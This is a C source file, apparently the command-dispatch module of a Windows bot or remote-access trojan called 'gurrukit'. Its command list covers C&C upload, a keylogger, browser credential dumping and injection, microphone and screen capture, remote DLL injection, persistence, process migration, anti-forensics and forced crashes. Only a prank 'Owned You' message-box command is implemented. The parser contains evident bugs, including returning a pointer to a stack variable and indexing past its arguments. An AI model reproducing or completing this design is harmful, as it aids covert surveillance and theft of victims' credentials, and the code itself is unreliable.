#include <windows.h>
#include "include/gurrukit.h"
#include "include/memory.h"
#include "include/http.h"
#include "include/reply.h"
#include "include/cmd.h"


int __stdcall cmdOwned(PCMD pCmd);				//owned				(Send funny message)
int __stdcall cmdDownload(PCMD pCmd);			//download			(Download file by HTTP/S)
int __stdcall cmdUpload(PCMD pCmd);				//upload			(Upload file to Cibby C&C)
int __stdcall cmdListDir(PCMD pCmd);			//dir				(List all files in directory)
int __stdcall cmdKeylogger(PCMD pCmd);			//keylogger			(Keylogger start)
int __stdcall cmdBSOD(PCMD pCmd);				//bsod				(Destroy current kernel execution)
int __stdcall cmdRExec(PCMD pCmd);				//rexec				(Execute or inject PE/DLL downloaded by HTTP/S)
int __stdcall cmdUpdate(PCMD pCmd);				//update			(Update gurrukit version)
int __stdcall cmdScreenShot(PCMD pCmd);			//screencap			(Screenshot screen)
int __stdcall cmdMicroRecord(PCMD pCmd);		//microcap			(Microphone capture)
int __stdcall cmdBrowserHistory(PCMD pCmd);		//browser -history	(List browsers history)
int __stdcall cmdBrowserSpy(PCMD pCmd);			//browser -spy		(Spy running browsers)
int __stdcall cmdBrowserPasswords(PCMD pCmd);	//browser -pass		(Dump credentials from browsers)
int __stdcall cmdBrowserInject(PCMD pCmd);		//browser -inject	(Inject data or URL in running browsers)
int __stdcall cmdSecureDelete(PCMD pCmd);		//delete			(Delete file securely)
int __stdcall cmdCryptFile(PCMD pCmd);			//crypt				(Crypt file)
int __stdcall cmdPersistence(PCMD pCmd);		//persistence		(Persistence on disk)
int __stdcall cmdProcessList(PCMD pCmd);		//process -list		(List process)
int __stdcall cmdProcessMigrate(PCMD pCmd);		//process -migrate	(Migrate to other process)
int __stdcall cmdProcessKill(PCMD pCmd);		//process -kill		(Kill process)
int __stdcall cmdProcessSpy(PCMD pCmd);			//process -spy		(Spy process (hook strategical APIs) )
int __stdcall cmdSysInfo(PCMD pCmd);			//sys -info			(Information about system)
int __stdcall cmdSysApps(PCMD pCmd);			//sys -apps			(Information about installed applications)
int __stdcall cmdSysSpy(PCMD pCmd);				//sys -spy			(Spy all ring3 process of system)
int __stdcall cmdAntiForensic(PCMD pCmd);		//antiforense		(Remove DLL PE Header and blind in now dll space)
int __stdcall cmdMergeDll(PCMD pCmd);			//mergedell			(Alloc DLL in genuine dll espace)
int __stdcall cmdRegister(PCMD pCmd);			//register			(Renew bot register in C&C)

CMDRPC commands[] = {
	{ L"owned", &cmdOwned },
	{ NULL, NULL }
};



PCMD CMDParser(wchar_t *wLine) {
	CMD cmd;
	wchar_t **wArgs;
	DWORD wArgsLen;
	int dwCount = 0;

	if ((wArgs = CommandLineToArgvW(wLine, &wArgsLen)) == NULL)
		return((PCMD)NULL);
		
	if (wArgsLen > CMD_MAX_ARGS)
		wArgsLen = CMD_MAX_ARGS;

	cmd.dwArgsCount = 0;
	for (dwCount = 0; dwCount < wArgsLen; dwCount++) {

		if (dwCount == 0 && wArgs[0]) {
			cmd.wCommand = MemoryAlloc(CMD_MAX_COMMAND_LEN * 2);
			lstrcpynW(cmd.wArgs[0], wArgs[0], CMD_MAX_COMMAND_LEN);
		}
		else if (wArgs[dwCount]) {
			cmd.wArgs[cmd.dwArgsCount] = MemoryAlloc(CMD_MAX_ARGS_LEN * 2);
			lstrcpynW(cmd.wArgs[cmd.dwArgsCount], wArgs[dwCount], CMD_MAX_ARGS_LEN);
			cmd.dwArgsCount++;
		}

	}

	cmd.bStatus = TRUE;


	return(&cmd);
}


BOOL CMDExecute(PCMD pCmd) {
	
	return(TRUE);
}

VOID CMDFree(PCMD pCmd) {
	int i = 0;
	
	for (i = 0; i < pCmd->dwArgsCount+1; i++)
		MemoryFree(pCmd->wArgs[i]);

	pCmd->dwArgsCount = pCmd->bStatus = FALSE;
}



/*
	Commands
*/
int __stdcall cmdOwned(PCMD pCmd) {
	if (pCmd->dwArgsCount == 1)
		return(MessageBoxW(NULL, L"Owned You", pCmd->wArgs[0], 0));
	else if (pCmd->dwArgsCount == 2)
		return(MessageBoxW(NULL, pCmd->wArgs[2], pCmd->wArgs[0], 0));
	else
		return(MessageBoxW(NULL, L"Owned You", "jennylab!gurrukit/0.1", 0));
}